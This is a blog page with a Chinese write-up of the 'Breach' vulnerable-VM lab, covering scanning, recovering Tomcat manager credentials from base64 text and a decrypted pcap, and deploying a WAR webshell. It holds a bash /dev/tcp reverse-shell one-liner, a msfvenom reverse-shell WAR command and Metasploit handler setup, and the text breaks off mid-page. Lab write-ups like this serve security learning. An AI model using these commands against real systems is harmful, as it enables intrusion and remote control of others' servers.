<!DOCTYPE HTML>
<html>
<head>
  <meta charset="utf-8">
  <meta http-equiv="pragma" content="no-cache">
  <meta http-equiv="cache-control" content="no-cache">
  <meta http-equiv="expires" content="0">
  
  <title>Breach-writeup | Zoukba&#39;s gun</title>
  <meta name="author" content="zoukba">
  
  <meta name="description" content="Breach信息搜集nmap探活123456789nmap -sP 192.168.110.0/24Starting Nmap 7.80 ( https://nmap.org ) at 2021-05-02 17:56 CSTNmap scan report for 192.168.110.1Host is up (0.00054s latency).Nmap scan report for 192.168.110.2Host is up (0.00045s latency).Nmap scan report for 192.168.110.140Host is up (0.0018s latency).Nmap done: 256 IP addresses (3 hosts up) scanned in 3.14 seconds
好！ 我们发现了一个140
端口探测12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273cat nmap/vm.nmap# Nmap 7.80 scan initiated Sun May  2 00:28:05 2021 as: nmap -sV -sC -oA nmap/vm 192.168.110.140Nmap scan report for 192.168.110.140Host is up (0.093s latency).PORT      STATE SERVICE                VERSION1/tcp     open  tcpmux?| fingerprint-strings:|   NULL:|_    550 12345 00000000000000000000000000000000000000000000000000000003/tcp     open  compressnet?| fingerprint-strings:|   NULL:|_    550 12345 00000000000000000000000000000000000000000000000000000004/tcp     open  unknown| fingerprint-strings:|   NULL:|_    550 12345 00000000000000000000000000000000000000000000000000000006/tcp     open  unknown| fingerprint-strings:|   NULL:|_    550 12345 0ffffffffffffffffffffffffffffffffffffffffffffffffffff007/tcp     open  echo?| fingerprint-strings:|   NULL:|_    550 12345 0fffffffffffff777778887777777777cffffffffffffffffffff009/tcp     open  discard?...[skip]...57294/tcp open  unknown| fingerprint-strings:|   NULL:|     HTTP/1.0 200 OK|     uServer: Mono.WebServer2/YjmrJcx Unix|_    X-AspNet-Version: 34857797/tcp open  nntp| fingerprint-strings:|   NULL:|_    200 RgoetKI DNEWS Version *5Qnposting OK58080/tcp open  imap                   Dovecot imapd|_imap-capabilities: CAPABILITY60020/tcp open  http                   VMware hostd httpd|_http-title: Site doesn&amp;#x27;t have a title (text; charset=plain).60443/tcp open  ftp                    FileZilla ftpd (Mandatory SSL)61532/tcp open  http                   NS httpd C (Windows Terminal Server)|_http-server-header: NS_C|_http-title: Did not follow redirect to http://XhjUmz/wts61900/tcp open  imap                   Cisco VPN Concentrator 3000-series imapd|_imap-capabilities: CAPABILITY62078/tcp open  iphone-sync?| fingerprint-strings:|   NULL:|     HTTP/1.965 p|_    Server: IceWarp WebSrv/9340225463331/tcp open  http                   Port25 PowerMTA mail gateway http admin|_http-title: Site doesn&amp;#x27;t have a title (text/html).64623/tcp open  unknown| fingerprint-strings:|   NULL:|     &amp;#123;type INIT&amp;#125; &amp;#123;up 5 &amp;#123;auth 4 &amp;#123;name &amp;#123;|_    5a&amp;#125;&amp;#125; &amp;#123;ip 77084327&amp;#125; &amp;#123;max 4 &amp;#123;port 564680/tcp open  unknown| fingerprint-strings:|   NULL:|     HTTP/1.0 404 Not Found|     Content-Length: 3r|     Content-Type: text/html|_    k&amp;lt;title&amp;gt;Note: The requested URL could not be retrieved.&amp;lt;/title&amp;gt;bbackground-image: url(../../de/images/bg_ramp.jpg);65000/tcp open  unknown| fingerprint-strings:|   NULL:|_    -ERR operation not permitted
好家伙！一波爆炸！退出靶机，关掉kali，宣告失败
网页探索主页看源码发现有base64加密进行解密两次base64解密得到了"> 
  
  
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

  <meta property="og:title" content="Breach-writeup"/>
  <meta property="og:site_name" content="Zoukba&#39;s gun"/>

  
    <meta property="og:image" content=""/>
  

  
    <link rel="alternative" href="/[object Object]" title="Zoukba&#39;s gun" type="application/atom+xml">
  
  
  
  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->

  <script src="/js/jquery-2.0.3.min.js"></script>

  <!-- analytics -->
  
  <!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-70812759-1"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-70812759-1');
</script>






<meta name="generator" content="Hexo 5.4.0"></head>

 <body>  
  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
    <div class="container">
      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
		<span class="sr-only">Toggle navigation</span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
      </button>
	  <a class="navbar-brand" href="/">Zoukba&#39;s gun</a>
      <div class="collapse navbar-collapse nav-menu">
		<ul class="nav navbar-nav">
		  
		  <li>
			<a href="/archives" title="All the articles.">
			  <i class="fa fa-archive"></i>Archives
			</a>
		  </li>
		  
		  <li>
			<a href="/categories" title="All the categories.">
			  <i class="fa fa-folder"></i>Categories
			</a>
		  </li>
		  
		  <li>
			<a href="/tags" title="All the tags.">
			  <i class="fa fa-tags"></i>Tags
			</a>
		  </li>
		  
		  <li>
			<a href="/about" title="About me.">
			  <i class="fa fa-user"></i>About
			</a>
		  </li>
		  
		  <li>
			<a href="/atom.xml" title="Subscribe me.">
			  <i class="fa fa-user"></i>RSS
			</a>
		  </li>
		  
		</ul>
      </div>
    </div> <!-- container -->
</nav>
<div class="clearfix"></div>

  <div class="container">
  	<div class="content">
    	 


	
		<div class="page-header">
			<h1> Breach-writeup</h1>
		</div>
	



<div class="row post">
	<!-- cols -->
	
	<div id="top_meta"></div>
	<div class="col-md-9">
	

	<!-- content -->
	<div class="mypage">		
	  		

	  <h1 id="Breach"><a href="#Breach" class="headerlink" title="Breach"></a>Breach</h1><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><h3 id="nmap探活"><a href="#nmap探活" class="headerlink" title="nmap探活"></a>nmap探活</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 192.168.110.0/24</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2021-05-02 17:56 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.110.1</span><br><span class="line">Host is up (0.00054s latency).</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.110.2</span><br><span class="line">Host is up (0.00045s latency).</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.110.140</span><br><span class="line">Host is up (0.0018s latency).</span><br><span class="line">Nmap <span class="keyword">done</span>: 256 IP addresses (3 hosts up) scanned <span class="keyword">in</span> 3.14 seconds</span><br></pre></td></tr></table></figure>
<p>好！ 我们发现了一个140</p>
<h3 id="端口探测"><a href="#端口探测" class="headerlink" title="端口探测"></a>端口探测</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line">cat nmap/vm.nmap</span><br><span class="line"><span class="comment"># Nmap 7.80 scan initiated Sun May  2 00:28:05 2021 as: nmap -sV -sC -oA nmap/vm 192.168.110.140</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.110.140</span><br><span class="line">Host is up (0.093s latency).</span><br><span class="line"></span><br><span class="line">PORT      STATE SERVICE                VERSION</span><br><span class="line">1/tcp     open  tcpmux?</span><br><span class="line">| fingerprint-strings:</span><br><span class="line">|   NULL:</span><br><span class="line">|_    550 12345 0000000000000000000000000000000000000000000000000000000</span><br><span class="line">3/tcp     open  compressnet?</span><br><span class="line">| fingerprint-strings:</span><br><span class="line">|   NULL:</span><br><span class="line">|_    550 12345 0000000000000000000000000000000000000000000000000000000</span><br><span class="line">4/tcp     open  unknown</span><br><span class="line">| fingerprint-strings:</span><br><span class="line">|   NULL:</span><br><span class="line">|_    550 12345 0000000000000000000000000000000000000000000000000000000</span><br><span class="line">6/tcp     open  unknown</span><br><span class="line">| fingerprint-strings:</span><br><span class="line">|   NULL:</span><br><span class="line">|_    550 12345 0ffffffffffffffffffffffffffffffffffffffffffffffffffff00</span><br><span class="line">7/tcp     open  <span class="built_in">echo</span>?</span><br><span class="line">| fingerprint-strings:</span><br><span class="line">|   NULL:</span><br><span class="line">|_    550 12345 0fffffffffffff777778887777777777cffffffffffffffffffff00</span><br><span class="line">9/tcp     open  discard?</span><br><span class="line">...</span><br><span class="line">[skip]</span><br><span class="line">...</span><br><span class="line">57294/tcp open  unknown</span><br><span class="line">| fingerprint-strings:</span><br><span class="line">|   NULL:</span><br><span class="line">|     HTTP/1.0 200 OK</span><br><span class="line">|     uServer: Mono.WebServer2/YjmrJcx Unix</span><br><span class="line">|_    X-AspNet-Version: 348</span><br><span class="line">57797/tcp open  nntp</span><br><span class="line">| fingerprint-strings:</span><br><span class="line">|   NULL:</span><br><span class="line">|_    200 RgoetKI DNEWS Version *5Qnposting OK</span><br><span class="line">58080/tcp open  imap                   Dovecot imapd</span><br><span class="line">|_imap-capabilities: CAPABILITY</span><br><span class="line">60020/tcp open  http                   VMware hostd httpd</span><br><span class="line">|_http-title: Site doesn<span class="string">&#x27;t have a title (text; charset=plain).</span></span><br><span class="line"><span class="string">60443/tcp open  ftp                    FileZilla ftpd (Mandatory SSL)</span></span><br><span class="line"><span class="string">61532/tcp open  http                   NS httpd C (Windows Terminal Server)</span></span><br><span class="line"><span class="string">|_http-server-header: NS_C</span></span><br><span class="line"><span class="string">|_http-title: Did not follow redirect to http://XhjUmz/wts</span></span><br><span class="line"><span class="string">61900/tcp open  imap                   Cisco VPN Concentrator 3000-series imapd</span></span><br><span class="line"><span class="string">|_imap-capabilities: CAPABILITY</span></span><br><span class="line"><span class="string">62078/tcp open  iphone-sync?</span></span><br><span class="line"><span class="string">| fingerprint-strings:</span></span><br><span class="line"><span class="string">|   NULL:</span></span><br><span class="line"><span class="string">|     HTTP/1.965 p</span></span><br><span class="line"><span class="string">|_    Server: IceWarp WebSrv/93402254</span></span><br><span class="line"><span class="string">63331/tcp open  http                   Port25 PowerMTA mail gateway http admin</span></span><br><span class="line"><span class="string">|_http-title: Site doesn&#x27;</span>t have a title (text/html).</span><br><span class="line">64623/tcp open  unknown</span><br><span class="line">| fingerprint-strings:</span><br><span class="line">|   NULL:</span><br><span class="line">|     &#123;<span class="built_in">type</span> INIT&#125; &#123;up 5 &#123;auth 4 &#123;name &#123;</span><br><span class="line">|_    5a&#125;&#125; &#123;ip 77084327&#125; &#123;max 4 &#123;port 5</span><br><span class="line">64680/tcp open  unknown</span><br><span class="line">| fingerprint-strings:</span><br><span class="line">|   NULL:</span><br><span class="line">|     HTTP/1.0 404 Not Found</span><br><span class="line">|     Content-Length: 3r</span><br><span class="line">|     Content-Type: text/html</span><br><span class="line">|_    k&lt;title&gt;Note: The requested URL could not be retrieved.&lt;/title&gt;bbackground-image: url(../../de/images/bg_ramp.jpg);</span><br><span class="line">65000/tcp open  unknown</span><br><span class="line">| fingerprint-strings:</span><br><span class="line">|   NULL:</span><br><span class="line">|_    -ERR operation not permitted</span><br></pre></td></tr></table></figure>
<p>好家伙！一波爆炸！<br>退出靶机，关掉kali，宣告失败</p>
<h3 id="网页探索"><a href="#网页探索" class="headerlink" title="网页探索"></a>网页探索</h3><p><img src="https://cdn.jsdelivr.net/gh/zoukba0014/imagehost/img/20210504004428.png"><br>主页看源码发现有base64加密进行解密<br><img src="https://cdn.jsdelivr.net/gh/zoukba0014/imagehost/img/20210504004459.png"><br>两次base64解密<br>得到了</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pgibbons:damnitfeel$goodtobeagang<span class="variable">$ta</span></span><br><span class="line"><span class="comment">#猜测账号</span></span><br><span class="line">pgibbons</span><br><span class="line"><span class="comment">#猜测密码</span></span><br><span class="line">damnitfeel$goodtobeagang<span class="variable">$ta</span></span><br></pre></td></tr></table></figure>
<p>来不错让我们继续发现<br><img src="https://cdn.jsdelivr.net/gh/zoukba0014/imagehost/img/20210504004500.png"><br>发现登录界面。CMS为impresscms<br>我想的是搜索impresscms漏洞，尝试使用exploit-db漏洞</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">searchsploit impresscms</span><br><span class="line">--------------------------------------------------------------------- ---------------------------------</span><br><span class="line"> Exploit Title                                                       |  Path</span><br><span class="line">--------------------------------------------------------------------- ---------------------------------</span><br><span class="line">ImpressCMS 1.2.x - <span class="string">&#x27;quicksearch_ContentContent&#x27;</span> HTML Injection       | php/webapps/35134.txt</span><br><span class="line">ImpressCMS 1.3.11 - <span class="string">&#x27;bid&#x27;</span> SQL Injection                              | php/webapps/46239.txt</span><br><span class="line">ImpressCMS 1.3.5 - Multiple Vulnerabilities                          | php/webapps/31431.txt</span><br><span class="line">ImpressCMS 1.3.9 - SQL Injection                                     | php/webapps/39737.txt</span><br><span class="line">--------------------------------------------------------------------- ---------------------------------</span><br><span class="line">Shellcodes: No Results</span><br></pre></td></tr></table></figure>
<p>这里我用了点时间测试没发现没有一个可以使用的，因为所有的sql都是在admin权限的基础上的，而我打到的用户名和密码不是admin<br><img src="https://cdn.jsdelivr.net/gh/zoukba0014/imagehost/img/20210504004501.png"></p>
<h3 id="后台探索"><a href="#后台探索" class="headerlink" title="后台探索"></a>后台探索</h3><p><img src="https://cdn.jsdelivr.net/gh/zoukba0014/imagehost/img/20210504004502.png"><br>三份邮件<br><img src="https://cdn.jsdelivr.net/gh/zoukba0014/imagehost/img/20210504004503.png"><br>在这一份邮件中我得到了keystore<br>提示可以得到ssl证书<br><img src="https://cdn.jsdelivr.net/gh/zoukba0014/imagehost/img/20210504004504.png"><br>bang！来了说有红队进去了<br>接下来就是看下数据报然后搞清楚漏洞在哪里</p>
<h2 id="探索数据报"><a href="#探索数据报" class="headerlink" title="探索数据报"></a>探索数据报</h2><p><img src="https://cdn.jsdelivr.net/gh/zoukba0014/imagehost/img/20210504004505.png"><br>加密过追踪tls看不出数据，但我们得到了keystore并且知道了他的密码都为tomcat，我们需要建立自己的私钥</p>
<h3 id="建立私钥"><a href="#建立私钥" class="headerlink" title="建立私钥"></a>建立私钥</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">keytool -list -v -keystore keystore</span><br><span class="line">输入密钥库口令:</span><br><span class="line">密钥库类型: jks</span><br><span class="line">密钥库提供方: SUN</span><br><span class="line"></span><br><span class="line">您的密钥库包含 1 个条目</span><br><span class="line"></span><br><span class="line">别名: tomcat</span><br><span class="line">创建日期: 2016-5-21</span><br><span class="line">条目类型: PrivateKeyEntry</span><br><span class="line">证书链长度: 1</span><br><span class="line">证书[1]:</span><br><span class="line">所有者: CN=Unknown, OU=Unknown, O=Unknown, L=Unknown, ST=Unknown, C=Unknown</span><br><span class="line">发布者: CN=Unknown, OU=Unknown, O=Unknown, L=Unknown, ST=Unknown, C=Unknown</span><br><span class="line">序列号: 60856e88</span><br><span class="line">有效期为 Sat May 21 01:51:07 CST 2016 至 Fri Aug 19 01:51:07 CST 2016</span><br><span class="line">证书指纹:</span><br><span class="line">	 MD5:  C4:72:E6:B0:5F:58:CE:8B:B4:7E:2D:67:86:A9:52:A0</span><br><span class="line">	 SHA1: D5:D2:49:C3:69:93:CC:E5:39:A9:DE:5C:91:DC:F1:26:A6:40:46:53</span><br><span class="line">	 SHA256: F0:4A:E8:7F:52:C1:78:B4:14:2B:4D:D9:1A:34:31:F7:19:0A:29:F6:0C:85:00:0B:58:3A:37:20:6C:7E:E6:31</span><br><span class="line">签名算法名称: SHA256withRSA</span><br><span class="line">主体公共密钥算法: 2048 位 RSA 密钥</span><br><span class="line">版本: 3</span><br><span class="line"></span><br><span class="line">扩展:</span><br><span class="line"></span><br><span class="line"><span class="comment">#1: ObjectId: 2.5.29.14 Criticality=false</span></span><br><span class="line">SubjectKeyIdentifier [</span><br><span class="line">KeyIdentifier [</span><br><span class="line">0000: 47 6B A3 37 ED A5 1F 0A   0D 61 CA AA 17 9C F4 8C  Gk.7.....a......</span><br><span class="line">0010: 10 64 87 DF                                        .d..</span><br><span class="line">]</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">*******************************************</span><br><span class="line">*******************************************</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Warning:</span><br><span class="line">JKS 密钥库使用专用格式。建议使用 <span class="string">&quot;keytool -importkeystore -srckeystore keystore -destkeystore keystore -deststoretype pkcs12&quot;</span> 迁移到行业标准格式 PKCS12。</span><br></pre></td></tr></table></figure>
<p>我们可以根据warning提示建立私钥导入到wireshark内来解密ssl加密</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">keytool -v -importkeystore -srckeystore keystore -srcalias tomcat -destkeystore myp12file.p12 -deststoretype PKCS12</span><br><span class="line">正在将密钥库 keystore 导入到 myp12file.p12...</span><br><span class="line">输入目标密钥库口令:</span><br><span class="line">再次输入新口令:</span><br><span class="line">输入源密钥库口令:</span><br><span class="line">[正在存储myp12file.p12]</span><br></pre></td></tr></table></figure>
<p>keytool是个密钥工具，之后会补上keytool的使用</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">   -storepass keystore	文件存储密码</span><br><span class="line">   -keypass 私钥加解密密码</span><br><span class="line">   -<span class="built_in">alias</span> 实体别名(包括证书私钥)</span><br><span class="line">   -dname 证书个人信息</span><br><span class="line">   -keyalt 采用公钥算法，默认是DSA</span><br><span class="line">   -keysize 密钥长度(DSA算法对应的默认算法是sha1withDSA，不支持2048长度，此时需指定 RSA)</span><br><span class="line">   -validity 有效期</span><br><span class="line">   -keystore 指定keystore文件</span><br><span class="line">-srckeystore &lt;srckeystore&gt;            源密钥库名称</span><br><span class="line">	-destkeystore &lt;destkeystore&gt;          目标密钥库名称</span><br><span class="line">	-srcstoretype &lt;srcstoretype&gt;          源密钥库类型</span><br><span class="line">	-deststoretype &lt;deststoretype&gt;        目标密钥库类型</span><br><span class="line">	-srcstorepass &lt;arg&gt;                   源密钥库口令</span><br><span class="line">	-deststorepass &lt;arg&gt;                  目标密钥库口令</span><br><span class="line">	-srcprotected                         受保护的源密钥库口令</span><br><span class="line">	-srcprovidername &lt;srcprovidername&gt;    源密钥库提供方名称</span><br><span class="line">	-destprovidername &lt;destprovidername&gt;  目标密钥库提供方名称</span><br><span class="line">	-srcalias &lt;srcalias&gt;                  源别名</span><br><span class="line">	-destalias &lt;destalias&gt;                目标别名</span><br><span class="line">	-srckeypass &lt;arg&gt;                     源密钥口令</span><br><span class="line">	-destkeypass &lt;arg&gt;                    目标密钥口令</span><br><span class="line">	-noprompt                             不提示</span><br><span class="line">	-providerclass &lt;providerclass&gt;        提供方类名</span><br><span class="line">	-providerarg &lt;arg&gt;                    提供方参数</span><br><span class="line">	-providerpath &lt;pathlist&gt;              提供方类路径</span><br><span class="line">	-v                                    详细输出</span><br></pre></td></tr></table></figure>
<p>然后我们将密钥导入wireshark<br><img src="https://cdn.jsdelivr.net/gh/zoukba0014/imagehost/img/20210504004506.png"></p>
<h3 id="得到解密数据报"><a href="#得到解密数据报" class="headerlink" title="得到解密数据报"></a>得到解密数据报</h3><p><img src="https://cdn.jsdelivr.net/gh/zoukba0014/imagehost/img/20210504004507.png"><br>显示了明文数据</p>
<h2 id="数据报解读"><a href="#数据报解读" class="headerlink" title="数据报解读"></a>数据报解读</h2><p>url</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.168.110.140:8443/_M@nag3Me/html</span><br></pre></td></tr></table></figure>
<p>在url出是一个tomcat管理页面</p>
<h3 id="页面详情"><a href="#页面详情" class="headerlink" title="页面详情"></a>页面详情</h3><p><img src="https://cdn.jsdelivr.net/gh/zoukba0014/imagehost/img/20210504004508.png"><br>提示需要账号和密码<br>我试了以暴露出的密码都失败，回到数据包<br><img src="https://cdn.jsdelivr.net/gh/zoukba0014/imagehost/img/20210504004509.png"><br>在第二个包内</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Authorization: Basic dG9tY2F0OlR0XDVEOEYoIyEqdT1HKTRtN3pC</span><br></pre></td></tr></table></figure>
<p>解密<br><img src="https://cdn.jsdelivr.net/gh/zoukba0014/imagehost/img/20210504004510.png"><br>得到密码</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tomcat:Tt\5D8F(<span class="comment">#!*u=G)4m7zB</span></span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.jsdelivr.net/gh/zoukba0014/imagehost/img/20210504004512.png"></p>
<h2 id="上传war马"><a href="#上传war马" class="headerlink" title="上传war马"></a>上传war马</h2><h3 id="godzilla"><a href="#godzilla" class="headerlink" title="godzilla"></a>godzilla</h3><p>用godzilla生成一个恶意jsp然后打包成war上传</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">jar -cvf 123.war 123.jsp</span><br><span class="line">已添加清单</span><br><span class="line">正在添加: 123.jsp(输入 = 2615) (输出 = 909)(压缩了 65%)</span><br><span class="line"> ~/Desktop/vm  ls</span><br><span class="line">10-漏洞利用.md                  Pasted image 20210502181853.png Pasted image 20210503150753.png</span><br><span class="line">123.jsp                         Pasted image 20210502181923.png Pasted image 20210503150802.png</span><br><span class="line">123.war                         Pasted image 20210502182228.png Pasted image 20210503151017.png</span><br><span class="line">5-信息搜集.md                   Pasted image 20210503144541.png _SSL_test_phase1.pcap</span><br><span class="line">Pasted image 20210502180640.png Pasted image 20210503145415.png keystore</span><br><span class="line">Pasted image 20210502181107.png Pasted image 20210503145622.png myp12file.p12</span><br><span class="line">Pasted image 20210502181404.png Pasted image 20210503150458.png nmap</span><br><span class="line">Pasted image 20210502181742.png Pasted image 20210503150625.png www</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.jsdelivr.net/gh/zoukba0014/imagehost/img/20210504004513.png"><br>查看网页是否成功<br>404<br><img src="https://cdn.jsdelivr.net/gh/zoukba0014/imagehost/img/20210504004514.png"><br>在上传一次<br><img src="https://cdn.jsdelivr.net/gh/zoukba0014/imagehost/img/20210504004515.png"><br>成功<br><img src="https://cdn.jsdelivr.net/gh/zoukba0014/imagehost/img/20210504004516.png"><br>但是连不上<br>他会在一定周期内删除上传的东西，需要加载cookies，jession才能连接并且要挂上http代理<br><img src="https://cdn.jsdelivr.net/gh/zoukba0014/imagehost/img/20210504004517.png"><br>成功打算弹个shell<br>没有成功，并且shell总是断，尝试植入内存shell</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/_M@nag3Me/html/favicon.ico</span><br></pre></td></tr></table></figure>
<p>内存马无权限<br>现在我只想能够有个稳定的shell<br>所以我必须要反弹个shell回来</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;bash -i &gt;&amp; /dev/tcp/192.168.110.1/9000 0&gt;&amp;1&quot;</span> | bash</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.jsdelivr.net/gh/zoukba0014/imagehost/img/20210504004518.png"><br>失败</p>
<h3 id="msf"><a href="#msf" class="headerlink" title="msf"></a>msf</h3><p>我选择使用msf</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.110.1 LPORT=4444 -f war &gt; shell.war</span><br><span class="line">Payload size: 1100 bytes</span><br><span class="line">Final size of war file: 1100 bytes</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; use exploit/multi/handler</span><br><span class="line">[*] Using configured payload generic/shell_reverse_tcp</span><br><span class="line">msf6 exploit(multi/handler) &gt; <span class="built_in">set</span> payload java/</span><br><span class="line"><span class="built_in">set</span> payload java/jsp_shell_bind_tcp         <span class="built_in">set</span> payload java/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> payload java/jsp_shell_reverse_tcp      <span class="built_in">set</span> payload java/shell/bind_tcp</span><br><span class="line"><span 